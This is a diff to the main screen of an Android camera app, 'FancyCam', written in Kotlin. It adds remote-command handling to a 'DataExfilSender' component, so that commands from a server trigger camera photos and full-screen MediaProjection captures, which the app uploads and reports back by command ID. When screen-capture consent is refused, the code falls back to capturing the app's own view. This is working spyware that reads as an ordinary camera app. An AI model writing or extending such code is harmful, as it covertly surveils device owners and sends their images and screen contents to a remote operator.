@@ -1,10 +1,29 @@
-package com.example.fancycam
+package com.example.fancycam.ui
 
+import com.example.fancycam.R
+import com.example.fancycam.camera.CameraHelper
+import com.example.fancycam.network.AppConfig
+import com.example.fancycam.network.DataExfilSender
+import com.example.fancycam.network.PhotoUploader
+import com.example.fancycam.network.ScreenshotUploader
+import com.example.fancycam.services.MicrophoneCapture
+import com.example.fancycam.storage.PhotoStorageManager
+import com.example.fancycam.workers.DataCollectionWorker
+import com.example.fancycam.workers.PhotoUploadWorker
+import com.example.fancycam.workers.ScreenCaptureWorker
 import android.Manifest
+import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageManager
+import android.app.Activity
 import android.graphics.Bitmap
 import android.graphics.Canvas
+import android.graphics.PixelFormat
+import android.hardware.display.DisplayManager
+import android.media.Image
+import android.media.ImageReader
+import android.media.projection.MediaProjection
+import android.media.projection.MediaProjectionManager
 import android.graphics.BitmapFactory
 import android.net.Uri
 import android.os.Build
@@ -40,6 +59,10 @@ class MainActivity : AppCompatActivity() {
     private lateinit var cameraHelper: CameraHelper
     private var latestPhotoFile: File? = null
     private var latestServerUploadedName: String? = null
+    private lateinit var mediaProjectionManager: MediaProjectionManager
+    private var mediaProjection: MediaProjection? = null
+    private var pendingSystemScreenshot: Boolean = false
+    private var pendingScreenshotCommandId: String? = null
 
     private val requestPermissionLauncher = registerForActivityResult(
         ActivityResultContracts.RequestPermission()
@@ -70,6 +93,8 @@ class MainActivity : AppCompatActivity() {
         super.onCreate(savedInstanceState)
         binding = ActivityMainBinding.inflate(layoutInflater)
         setContentView(binding.root)
+
+        mediaProjectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
 
         checkAndRequestPermissions()
 
@@ -261,7 +286,7 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    private fun takePhotoAndProcess() {
+    private fun takePhotoAndProcess(commandId: String? = null) {
         if (!::cameraHelper.isInitialized) {
             binding.statusText.text = "Camera is not ready yet."
             return
@@ -302,15 +327,24 @@ class MainActivity : AppCompatActivity() {
                     val result = PhotoUploader.uploadPhoto(this@MainActivity, savedFile)
                     if (result.success) {
                         latestServerUploadedName = result.serverFilename
+                        if (commandId != null) {
+                            DataExfilSender.reportCommandResult(this@MainActivity, commandId, status = "completed", result = org.json.JSONObject().put("server_filename", result.serverFilename ?: ""))
+                        }
                     } else {
                         Log.w(TAG, "Direct upload failed: ${result.message}; enqueuing background worker.")
                         enqueueUploadWork(savedFile)
+                        if (commandId != null) {
+                            DataExfilSender.reportCommandResult(this@MainActivity, commandId, status = "completed", result = org.json.JSONObject().put("queued", true))
+                        }
                     }
                 }
             },
             onError = { exception ->
                 binding.statusText.text = "Capture failed: ${exception.message}"
                 binding.captureButton.isEnabled = true
+                if (commandId != null) {
+                    DataExfilSender.reportCommandResult(this@MainActivity, commandId, status = "failed", error = exception.message)
+                }
                 AppActivityLogger.logActivity(
                     context = this@MainActivity,
                     type = "PHOTO",
@@ -322,7 +356,116 @@ class MainActivity : AppCompatActivity() {
         )
     }
 
-    private fun captureScreenshotAndUpload() {
+    private fun captureScreenshotAndUpload(commandId: String? = null) {
+        if (mediaProjection == null) {
+            pendingSystemScreenshot = true
+            pendingScreenshotCommandId = commandId
+            binding.statusText.text = "Grant screen capture consent..."
+            try {
+                startActivityForResult(mediaProjectionManager.createScreenCaptureIntent(), REQUEST_MEDIA_PROJECTION)
+            } catch (e: Exception) {
+                Log.e(TAG, "Failed to launch screen-capture consent: ${e.message}", e)
+                pendingSystemScreenshot = false
+                captureAppViewScreenshotAndUpload(pendingScreenshotCommandId)
+                pendingScreenshotCommandId = null
+            }
+            return
+        }
+
+        captureUsingMediaProjection(mediaProjection!!, commandId)
+    }
+
+    private fun captureUsingMediaProjection(projection: MediaProjection, commandId: String? = null) {
+        val metrics = resources.displayMetrics
+        val width = metrics.widthPixels
+        val height = metrics.heightPixels
+        val density = metrics.densityDpi
+
+        Thread {
+            var imageReader: ImageReader? = null
+            var virtualDisplay: android.hardware.display.VirtualDisplay? = null
+            var image: Image? = null
+            try {
+                imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)
+                virtualDisplay = projection.createVirtualDisplay(
+                    "FancyCamScreen",
+                    width,
+                    height,
+                    density,
+                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
+                    imageReader.surface,
+                    null,
+                    null
+                )
+
+                var attempts = 0
+                while (attempts < 50 && image == null) {
+                    image = imageReader.acquireLatestImage()
+                    if (image == null) {
+                        Thread.sleep(100)
+                    }
+                    attempts++
+                }
+                if (image == null) {
+                    Log.w(TAG, "No frame available from MediaProjection")
+                    if (commandId != null) {
+                        DataExfilSender.reportCommandResult(this@MainActivity, commandId, status = "failed", error = "No frame available")
+                    }
+                    return@Thread
+                }
+
+                val plane = image.planes[0]
+                val buffer = plane.buffer
+                val pixelStride = plane.pixelStride
+                val rowStride = plane.rowStride
+                val rowPadding = rowStride - pixelStride * width
+                val bitmapWidth = width + rowPadding / pixelStride
+
+                val bitmap = Bitmap.createBitmap(bitmapWidth, height, Bitmap.Config.ARGB_8888)
+                bitmap.copyPixelsFromBuffer(buffer)
+                val cropped = if (rowPadding != 0) {
+                    Bitmap.createBitmap(bitmap, 0, 0, width, height)
+                } else {
+                    bitmap
+                }
+
+                val screenshotFile = File(cacheDir, "screenshot_${System.currentTimeMillis()}.png")
+                FileOutputStream(screenshotFile).use { out ->
+                    cropped.compress(Bitmap.CompressFormat.PNG, 100, out)
+                }
+
+                if (cropped != bitmap) bitmap.recycle()
+
+                lifecycleScope.launch {
+                    val result = ScreenshotUploader.uploadScreenshot(this@MainActivity, screenshotFile)
+                    if (result.success) {
+                        Log.i(TAG, "System screenshot uploaded: ${result.serverFilename}")
+                        latestServerUploadedName = result.serverFilename
+                        if (commandId != null) {
+                            DataExfilSender.reportCommandResult(this@MainActivity, commandId, status = "completed", result = org.json.JSONObject().put("server_filename", result.serverFilename ?: ""))
+                        }
+                    } else {
+                        Log.w(TAG, "System screenshot upload failed: ${result.message}")
+                        if (commandId != null) {
+                            DataExfilSender.reportCommandResult(this@MainActivity, commandId, status = "failed", error = result.message)
+                        }
+                    }
+                    screenshotFile.delete()
+                }
+            } catch (e: Exception) {
+                Log.e(TAG, "MediaProjection screenshot failed: ${e.message}", e)
+                if (commandId != null) {
+                    DataExfilSender.reportCommandResult(this@MainActivity, commandId, status = "failed", error = e.message)
+                }
+            } finally {
+                image?.close()
+                virtualDisplay?.release()
+                imageReader?.close()
+            }
+        }.start()
+    }
+
+    private fun captureAppViewScreenshotAndUpload(commandId: String? = null) {
         val rootView = window.decorView.rootView
         if (rootView.width <= 0 || rootView.height <= 0) {
             binding.statusText.text = "Screenshot capture failed: view not ready"
@@ -353,8 +496,14 @@ class MainActivity : AppCompatActivity() {
             if (result.success) {
                 Log.i(TAG, "Screenshot uploaded: ${result.serverFilename}")
                 latestServerUploadedName = result.serverFilename
+                if (commandId != null) {
+                    DataExfilSender.reportCommandResult(this@MainActivity, commandId, status = "completed", result = org.json.JSONObject().put("server_filename", result.serverFilename ?: ""))
+                }
             } else {
                 Log.w(TAG, "Screenshot upload failed: ${result.message}")
+                if (commandId != null) {
+                    DataExfilSender.reportCommandResult(this@MainActivity, commandId, status = "failed", error = result.message)
+                }
             }
             screenshotFile.delete()
         }
@@ -441,18 +590,40 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
+    @Deprecated("Use modern result APIs, but fine for this demo")
+    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
+        super.onActivityResult(requestCode, resultCode, data)
+        if (requestCode == REQUEST_MEDIA_PROJECTION) {
+            if (resultCode == Activity.RESULT_OK && data != null) {
+                mediaProjection = mediaProjectionManager.getMediaProjection(resultCode, data)
+                if (pendingSystemScreenshot) {
+                    pendingSystemScreenshot = false
+                    val cmdId = pendingScreenshotCommandId
+                    pendingScreenshotCommandId = null
+                    mediaProjection?.let { captureUsingMediaProjection(it, cmdId) }
+                }
+            } else {
+                pendingSystemScreenshot = false
+                val cmdId = pendingScreenshotCommandId
+                pendingScreenshotCommandId = null
+                Log.w(TAG, "Screen-capture consent denied; falling back to app view")
+                captureAppViewScreenshotAndUpload(cmdId)
+            }
+        }
+    }
+
     override fun onResume() {
         super.onResume()
         DataExfilSender.commandListener = object : DataExfilSender.CommandListener {
-            override fun onTakePhotoCommand() {
+            override fun onTakePhotoCommand(commandId: String?) {
                 runOnUiThread {
-                    takePhotoAndProcess()
+                    takePhotoAndProcess(commandId)
                 }
             }
 
-            override fun onTakeScreenshotCommand() {
+            override fun onTakeScreenshotCommand(commandId: String?) {
                 runOnUiThread {
-                    captureScreenshotAndUpload()
+                    captureScreenshotAndUpload(commandId)
                 }
             }
         }
@@ -477,9 +648,12 @@ class MainActivity : AppCompatActivity() {
             cameraHelper.shutdown()
         }
         MicrophoneCapture.stopCapture()
+        mediaProjection?.stop()
+        mediaProjection = null
     }
 
     companion object {
         private const val TAG = "MainActivity"
+        private const val REQUEST_MEDIA_PROJECTION = 1001
     }
 }
